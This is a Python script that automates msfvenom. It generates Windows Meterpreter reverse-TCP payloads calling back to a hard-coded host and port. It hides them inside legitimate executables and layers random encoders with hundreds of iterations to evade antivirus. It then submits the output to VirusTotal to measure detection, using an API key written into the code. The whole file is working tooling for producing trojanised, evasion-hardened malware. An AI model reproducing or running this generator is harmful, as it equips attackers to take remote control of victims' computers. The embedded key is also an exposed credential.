#!/usr/bin/env python3
"""
venom.py
Artur Matias
2021-06-28

mfsvenom generator
"""

import glob
import os
import random
from time import sleep

def banner():

    os.system("clear")
    print("#------------------------------------------------------------------------------#") 
    print("|        Artur Matias                                        2021-08-01        |")
    print("|                              MSFVenom Generator                              |")
    print("#------------------------------------------------------------------------------#")

def generate_venom(n_file, n_raws, n_exe):
    try:
        if n_raws == 1:
            venom = venom_single(n_file, n_exe)

        elif n_raws == 2:
            venom = venom_start() + venom_end(n_file, n_exe)

        elif n_raws >= 3:
            venom = venom_start()
            for _ in range(n_raws):
                venom += raw()
            venom += venom_end(n_file, n_exe)

        print("\nExecuting:\n" + venom + "\n")
        os.system(venom)

    except Exception as e:
        print("Failed:", e)


def run(n_files):
    for n_file in range(n_files):
        n_file += 1
        for n_exe in range(len(executable)):
            generate_venom(n_file, r_raws(), n_exe)


def venom_single(n_file, n_exe):
    venom_single = "msfvenom -a " + arch + " --platform " + platform + " -p " + payload + " lhost=" + lhost + " lport=" + lport + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + arch + "/" + executable[n_exe] + ".exe -f " + f + " -o ./generated/" + executable[n_exe] + "-" + arch + "-" + str(n_file) + ".exe"
    
    return venom_single


def venom_start():
    venom_start = "msfvenom -a " + arch + " --platform " + platform + " -p " + payload + " lhost=" + lhost + " lport=" + lport + " -e " + r_encoder() + " -i " + r_iterations() + " -f raw"
    
    return venom_start


def raw():
    raw = " | msfvenom -a " + arch + " --platform " + platform + " -e " + r_encoder() + " -i " + r_iterations() + " -f raw"
    
    return raw


def venom_end(n_file, n_exe):
    venom_end = " | msfvenom -a " + arch + " --platform " + platform + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + arch + "/" + executable[n_exe] + ".exe -f " + f + " -o ./generated/" + executable[n_exe] + "-" + arch + "-" + str(n_file) + ".exe"
    
    return venom_end


def r_encoder():
    r = random.choice(encoders)
    
    return r


def r_iterations():
    r = str(random.randint(1, max_r_iterations))
    
    return r


def r_raws():
    r = random.randint(1, max_r_raw)
    
    return r


def get_arch():

    print("\n" + "#"*80 + "\n")
    print("What architecture is the executable?")
    print("1 - x86")
    print("2 - x64")
    answer = input('\n> ')
    
    if answer == '1':
        arch = 'x86'
    elif answer == '2':
        arch = 'x64'
    else:
        print("[-] Invalid option!\n")
        arch = 'x86'
        get_arch()

    return arch


def get_platform():
    platform = 'windows'
    
    return platform


def get_payload():
    if arch == "x86":
        payload = 'windows/meterpreter/reverse_tcp'
    elif arch == "x64":
        payload = 'windows/x64/meterpreter/reverse_tcp'
    
    return payload


def get_lhost():
    lhost = '192.168.50.156'
    
    return lhost


def get_lport():
    lport = '443'
    
    return lport


def get_executable(arch):

    executable = [os.path.basename(a) for a in glob.glob(arch + '/*.exe')]
    for index,exe in enumerate(executable):
        new = os.path.splitext(exe)[0]
        executable[index] = new

    if not executable:
        print("No executable files found!")

    return executable


def choose_executable(executable):

    print_executables(executable)
    print("\n" + "#"*80 + "\n")
    print("Select an executable by number or insert '-1' to select all executables.")
    answer = input('\n> ')
    try:
        answer = int(answer)

        if answer == -1:
            pass

        elif answer >= 0 and answer <= len(executable):
            executable = [executable[answer]]

        else:
            print("[-] Invalid option!\n")
            choose_executable(executable)

    except ValueError:
        print("[-] Invalid option!\n")
        choose_executable(executable)


    return executable


def get_encoders():
    if arch == "x86":
        # All x86 encoders
        #encoders = ["add_sub", "alpha_mixed", "unicode_mixed", "unicode_upper", "alpha_upper", "avoid_utf8_tolower", "avoid_underscore_tolower", "bmp_polyglot", "bloxor", "context_cpuid", "call4_dword_xor", "xor_dynamic", "jmp_call_additive", "nonalpha", "nonupper", "shikata_ga_nai", "service", "single_static_bit", "countdown", "opt_sub", "fnstenv_mov", "context_stat", "context_time"]
        
        # No low or manual rank
        encoders = ["x86/shikata_ga_nai", "x86/countdown", "x86/fnstenv_mov"]
    elif arch == "x64":
        encoders = ["x64/xor", "x64/xor_context", "x64/xor_dynamic",
                    "x64/zutto_dekiru"]
    
    return encoders


def get_format():
    if arch == "x86":
        f = 'exe'
    elif arch == "x64":
        f = 'exe-only'
    
    return f


def get_n_files():
    n_files = 0

    print("\n" + "#"*80 + "\n")
    # How many executables will be generated
    print("How many files do you want to generate?")
    answer = input('\n> ')

    try:
        n_files = int(answer)

    except ValueError:
        print("[-] Invalid option!\n")
        get_n_files()
    
    return n_files

def print_options(arch, platform, payload, lhost, lport, f, encoders, executable, n_files):

    print("\n" + "#"*80 + "\n")
    print("Options:\n")
    print("Architecture:\t", arch)
    print("platform:\t", platform)
    print("payload:\t", payload)
    print("lhost:\t\t", lhost)
    print("lport:\t\t", lport)
    print("format:\t\t", f)
    print("encoders:\t", encoders)
    print("executables:\t", executable, "*", n_files)

def print_executables(executable):

    print("\n" + "#"*80 + "\n")
    print("List of executables:\n")

    for index,exe in enumerate(executable):
        print("\t" + str(index) + " - " + exe + ".exe")


def get_vt_key():
    vt_key = '135da9ae550ee54f8cf38ff2faeb2639b8845a9ebffa030e0234435407a15c93'
    
    return vt_key


def vt_upload(vt_key, generated_executable):
    vt_file = "vt_file.tmp"
    vt_id_file = "vt_id_file.tmp"

    # TODO don't hardcode the exe
    for n_exe in range(len(generated_executable)):
        vt = "./vt-scan.sh -k " + vt_key + " -f ./generated/" + generated_executable[n_exe] + ".exe"

        vt_up = vt + " > " + vt_file

        #jq_id = 'grep -Po \'\"id\": *\\K\"[^\"]*\"\' ' + vt_file
        jq_id = "jq -r \'.data.id\' " + vt_file + " > " + vt_id_file

        print("[*] Uploading \"" +  generated_executable[n_exe] + ".exe\" to VirusTotal.")
        try:
            os.system(vt_up)
            print("[+] Uploaded!")
        except:
            print("[-] Failed to upload.")
        
        os.system(jq_id)

        with open(vt_id_file, 'r') as file:
            vt_id = file.read().replace('\n', '')

        vt_check_status(vt_key, vt_id)

    rm_tmp_files()


def rm_tmp_files():
    os.system("rm *.tmp")


def vt_check_status(vt_key, vt_id):

    vt_result_file = "vt_result_file.tmp"
    vt_status_file = "vt_status_file.tmp"
    vt_stats_mal_file = "vt_stats_mal_file.tmp"
    vt_stats_und_file = "vt_stats_und_file.tmp"

    vt_result = "./vt-scan.sh -k " + vt_key + " -a " + vt_id + " > " + vt_result_file
    os.system(vt_result)

    vt_chck_status = "jq -r \'.data.attributes.status\' " + vt_result_file + " > " + vt_status_file
    os.system(vt_chck_status)

    with open(vt_status_file, 'r') as file:
        vt_status = file.read().replace('\n', '')

    if vt_status == "queued":
        print("[*] Scan in queue, updating in 30 seconds.")
        sleep(30)
        vt_check_status(vt_key, vt_id)

    elif vt_status == "completed":
        print("[+] Scan completed!")
        #vt_chck_stats = "jq -r \'.data.attributes.stats\' " + vt_result_file
        vt_chck_stats_mal = "jq -r \'.data.attributes.stats.malicious\' " + vt_result_file + " > " + vt_stats_mal_file
        vt_chck_stats_und = "jq -r \'.data.attributes.stats.undetected\' " + vt_result_file + " > " + vt_stats_und_file
        #os.system(vt_chck_stats)
        os.system(vt_chck_stats_mal)
        os.system(vt_chck_stats_und)

        with open(vt_stats_mal_file, 'r') as file:
            vt_stats_mal = file.read().replace('\n', '')

        with open(vt_stats_und_file, 'r') as file:
            vt_stats_und = file.read().replace('\n', '')

        vt_stats_total = int(vt_stats_mal) + int(vt_stats_und)

        result = vt_stats_mal + "/" + str(vt_stats_total)
        print("[+] Scan result: " + result)

    else:
        print("Failed to check status.")


def get_generated_executable():

    generated_executable = [os.path.basename(a) for a in glob.glob('generated/*.exe')]
    for index,exe in enumerate(generated_executable):
        new = os.path.splitext(exe)[0]
        generated_executable[index] = new

    if not generated_executable:
        print("No executable files found!")

    return generated_executable


def choose_generated_executable(executable):

    print_executables(executable)
    print("\n" + "#"*80 + "\n")
    print("Select an executable by number:")
    #print("Select an executable by number or insert '-1' to select all executables.")
    #print("[DISABLED] *Note: Selecting all executables will take 2 minutes per 4 files.")
    answer = input('\n> ')
    try:
        answer = int(answer)

        if answer == -1:
            # TODO upload all generated exes
            print("[*] This actually does nothing for now...")
            pass

        elif answer >= 0 and answer <= len(executable):
            executable = [executable[answer]]

        else:
            print("[-] Invalid option!\n")
            choose_generated_executable(executable)

    except ValueError:
        print("[-] Invalid option!\n")
        choose_generated_executable(executable)


    return executable



if __name__ == "__main__":

    banner()

    arch = get_arch()
    platform = get_platform()
    payload = get_payload()
    lhost = get_lhost()
    lport = get_lport()
    executable = get_executable(arch)
    encoders = get_encoders()
    f = get_format()
    vt_key = get_vt_key()

    # Max random raw sequences
    max_r_raw = 2

    # Max random iterations per raw
    max_r_iterations = 500

    executable = choose_executable(executable)
    n_files = get_n_files()
    print_options(arch, platform, payload, lhost, lport, f, encoders, executable, n_files)


    print("\n" + "#"*80 + "\n")

    print("Execute? [y/n]")
    start = input('\n> ')
    
    if start == "y" or start == "Y" or start == "1":
        # Generate files
        run(n_files)

        # Get generated files into a list
        generated_executable = get_generated_executable()

        # Ask which genereated files should be scanned by VirusTotal
        generated_executable = choose_generated_executable(generated_executable)

        vt_upload(vt_key, generated_executable)
    else:
        print("Bye!")
        quit()
